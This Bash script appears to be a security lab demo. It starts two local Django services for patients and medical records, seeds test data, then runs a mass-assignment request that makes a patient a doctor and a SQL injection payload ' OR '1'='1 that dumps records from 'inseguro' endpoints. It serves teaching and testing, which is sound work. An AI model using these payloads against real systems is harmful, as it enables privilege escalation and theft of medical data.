#!/bin/bash

# Script final para demostrar ataques de Asignación Masiva e Inyección de SQL.
# Ambos microservicios ahora son autocontenidos para su autenticación.

# --- Configuración ---
PACIENTES_HOST=${PACIENTES_SERVICE_HOST:-127.0.0.1}
PACIENTES_PORT=${PACIENTES_SERVICE_PORT:-8001}
EXPEDIENTES_HOST=${EXPEDIENTES_SERVICE_HOST:-127.0.0.1}
EXPEDIENTES_PORT=${EXPEDIENTES_SERVICE_PORT:-8002}

HOST_PACIENTES="http://${PACIENTES_HOST}:${PACIENTES_PORT}"
HOST_EXPEDIENTES="http://${EXPEDIENTES_HOST}:${EXPEDIENTES_PORT}"
UNIQUE_ID=$(date +%s | cut -c 5-)

STARTED_PIDS=()

# --- Funciones de Utilidad ---
function print_title { echo -e "\n=====================================================\n$1\n====================================================="; }
function print_step { echo -e "\n-----------------------------------------------------\nPASO: $1\n-----------------------------------------------------"; }
function print_info { echo "INFO: $1"; }

function kill_servers {
    if [ ${#STARTED_PIDS[@]} -gt 0 ]; then
        kill "${STARTED_PIDS[@]}" &> /dev/null
    fi
}

function port_is_listening {
    local host=$1
    local port=$2
python3 - "$host" "$port" <<'PY'
import socket
import sys

host = sys.argv[1]
port = int(sys.argv[2])

if host in ("0.0.0.0", "::", ""):
    host = "127.0.0.1"

s = socket.socket()
s.settimeout(0.5)
try:
    s.connect((host, port))
except OSError:
    sys.exit(1)
else:
    sys.exit(0)
finally:
    s.close()
PY
}

function ensure_server {
    local name=$1
    local dir=$2
    local host=$3
    local port=$4

    if port_is_listening "$host" "$port"; then
        print_info "$name ya estaba escuchando en ${host}:${port}, se reutilizará."
        return
    fi

    print_info "Levantando $name en ${host}:${port}..."
    (cd "$dir" && python3 manage.py runserver "${host}:${port}") &
    STARTED_PIDS+=($!)
    sleep 5
}

trap kill_servers EXIT

# --- Inicio del Script ---
print_step "Iniciando servicios de Django"
ensure_server "servicio_pacientes" "servicio_pacientes" "$PACIENTES_HOST" "$PACIENTES_PORT"
ensure_server "servicio_expedientes" "servicio_expedientes" "$EXPEDIENTES_HOST" "$EXPEDIENTES_PORT"

# --- PREPARACIÓN: Crear datos de prueba ---
print_title "PREPARACIÓN: Creando usuarios y registros de prueba vía API"

# 1. Crear un Doctor en servicio_expedientes
print_info "Creando Doctor en servicio_expedientes..."
EXP_DOCTOR_EMAIL="exp_doc-$UNIQUE_ID@clinic.com"
EXP_DOCTOR_PASS="password123"
DOCTOR_RESPONSE=$(curl -s -X POST "$HOST_EXPEDIENTES/api/expedientes/doctor/registro" -H "Content-Type: application/json" -d "{\"nombre\":\"Dr. Expediente\", \"email\":\"$EXP_DOCTOR_EMAIL\", \"password\":\"$EXP_DOCTOR_PASS\", \"especialidad\":\"Cardiología\"}")
DOCTOR_ID=$(echo $DOCTOR_RESPONSE | jq -r .id)
if [ "$DOCTOR_ID" == "null" ] || [ -z "$DOCTOR_ID" ]; then
    echo "ERROR: No se pudo crear el Doctor en servicio_expedientes. Abortando."
    echo "Respuesta del servidor: $DOCTOR_RESPONSE"
    kill_servers
    exit 1
fi
print_info "Doctor creado con ID: $DOCTOR_ID"

# 2. Obtener token para ese Doctor
print_info "Obteniendo token del servicio de expedientes..."
AUTH_RESPONSE=$(curl -s -X POST "$HOST_EXPEDIENTES/api-token-auth/" -H "Content-Type: application/json" -d "{\"username\":\"$EXP_DOCTOR_EMAIL\",\"password\":\"$EXP_DOCTOR_PASS\"}")
EXP_TOKEN=$(echo $AUTH_RESPONSE | jq -r .token)
if [ "$EXP_TOKEN" == "null" ] || [ -z "$EXP_TOKEN" ]; then
    echo "ERROR: No se pudo obtener token de servicio_expedientes. Abortando."
    echo "Respuesta del servidor: $AUTH_RESPONSE"
    kill_servers
    exit 1
fi
print_info "Token de expedientes obtenido."

# 3. Crear Paciente A en servicio_pacientes
PACIENTE_A_NSS="NSS-A-$UNIQUE_ID"
# Fecha de nacimiento requerida por el endpoint (formato YYYY-MM-DD)
PAC_A_FECHA_NAC="1990-01-01"
# Construir JSON de forma segura para evitar problemas de comillas/escape
PAC_A_PAYLOAD=$(printf '{"nombre":"%s","nss":"%s","email":"%s","password":"%s","es_doctor":false,"fecha_nacimiento":"%s"}' "Paciente A" "$PACIENTE_A_NSS" "paciente-a-$UNIQUE_ID@example.com" "pass" "$PAC_A_FECHA_NAC")
PACIENTE_A_RESPONSE=$(curl -s -X POST "$HOST_PACIENTES/api/pacientes/seguro/registro" -H "Content-Type: application/json" -d "$PAC_A_PAYLOAD")
echo "Respuesta registro Paciente A:"; echo $PACIENTE_A_RESPONSE | jq .
PACIENTE_A_ID=$(echo $PACIENTE_A_RESPONSE | jq -r .id)
if [ "$PACIENTE_A_ID" == "null" ] || [ -z "$PACIENTE_A_ID" ]; then
    echo "ERROR: No se pudo crear el Paciente A. Abortando."
    echo "Respuesta del servidor: $PACIENTE_A_RESPONSE"
    kill_servers
    exit 1
fi

# 4. Usar el token de EXPEDIENTES para crear el expediente para Paciente A
print_info "Creando expediente para Paciente A..."
# Construir el JSON del expediente sin comillas anidadas (fecha formateada con printf)
CREATE_EXP_PAYLOAD=$(printf '{"paciente_nss":"%s","diagnostico":"%s","tratamiento":"%s","fecha_consulta":"%s"}' "$PACIENTE_A_NSS" "Secreto de Paciente A" "No compartir" "$(date -u +%Y-%m-%dT%H:%M:%SZ)")
CREATE_EXP_RESPONSE=$(curl -s -X POST "$HOST_EXPEDIENTES/api/expedientes/seguro/crear" -H "Content-Type: application/json" -H "Authorization: Token $EXP_TOKEN" -d "$CREATE_EXP_PAYLOAD")
EXPEDIENTE_ID=$(echo $CREATE_EXP_RESPONSE | jq -r .id)

if [ "$EXPEDIENTE_ID" == "null" ] || [ -z "$EXPEDIENTE_ID" ]; then
    echo "ERROR: Falla en la preparación, no se pudo crear el expediente. Abortando."
    echo "Respuesta del servidor: $CREATE_EXP_RESPONSE"
    kill_servers
    exit 1
fi
print_info "Creado Paciente A y su expediente médico secreto."

# 5. Crear Paciente B (víctima del ataque)
PACIENTE_B_FECHA_NAC="1992-02-02"
PACIENTE_B_PAYLOAD=$(printf '{"nombre":"%s","nss":"%s","email":"%s","password":"%s","es_doctor":false,"fecha_nacimiento":"%s"}' "Paciente B (no es doctor)" "NSS-B-$UNIQUE_ID" "paciente-b-$UNIQUE_ID@example.com" "pass" "$PACIENTE_B_FECHA_NAC")
PACIENTE_B_RESPONSE=$(curl -s -X POST "$HOST_PACIENTES/api/pacientes/seguro/registro" -H "Content-Type: application/json" -d "$PACIENTE_B_PAYLOAD")
PACIENTE_B_ID=$(echo $PACIENTE_B_RESPONSE | jq -r .id)
if [ "$PACIENTE_B_ID" == "null" ] || [ -z "$PACIENTE_B_ID" ]; then
    echo "ERROR: No se pudo crear el Paciente B. Abortando."
    echo "Respuesta del servidor: $PACIENTE_B_RESPONSE"
    kill_servers
    exit 1
fi
print_info "Creado Paciente B (es_doctor=false). ID: $PACIENTE_B_ID"


# --- ATAQUE 1: ASIGNACIÓN MASIVA ---
print_title "ATAQUE 1: Asignación Masiva de Privilegios"
ATTACK_RESPONSE=$(curl -s -X PUT "$HOST_PACIENTES/api/pacientes/inseguro/perfil/$PACIENTE_B_ID" -H "Content-Type: application/json" -d '{"es_doctor": true}')
echo "Respuesta del servidor:"; echo $ATTACK_RESPONSE | jq .
if [ "$(echo $ATTACK_RESPONSE | jq -r .es_doctor)" == "true" ]; then echo -e "\n\033[0;31mÉXITO DEL ATAQUE: El Paciente B ahora es doctor.\033[0m"; else echo -e "\n\033[0;32mFALLO DEL ATAQUE\033[0m"; fi


# --- ATAQUE 2: INYECCIÓN DE SQL ---
print_title "ATAQUE 2: Inyección de SQL para Robar Información"
SQL_INJECTION_PAYLOAD="' OR '1'='1"
ENCODED_PAYLOAD=$(python3 -c "import urllib.parse; print(urllib.parse.quote(\"$SQL_INJECTION_PAYLOAD\"))")
ATTACK_RESPONSE_SQL=$(curl -s -X GET "$HOST_EXPEDIENTES/api/expedientes/inseguro/buscar?nss=$ENCODED_PAYLOAD")
echo "Respuesta del servidor:"; echo $ATTACK_RESPONSE_SQL | jq .
if [[ $(echo "$ATTACK_RESPONSE_SQL" | jq 'length') -gt 0 ]]; then echo -e "\n\033[0;31mÉXITO DEL ATAQUE: Se han obtenido registros médicos sin autorización.\033[0m"; else echo -e "\n\033[0;32mFALLO DEL ATAQUE\033[0m"; fi


# Finalizar
print_step "Deteniendo los servidores"
kill_servers
print_info "Flujo de ataques completado."

exit 0
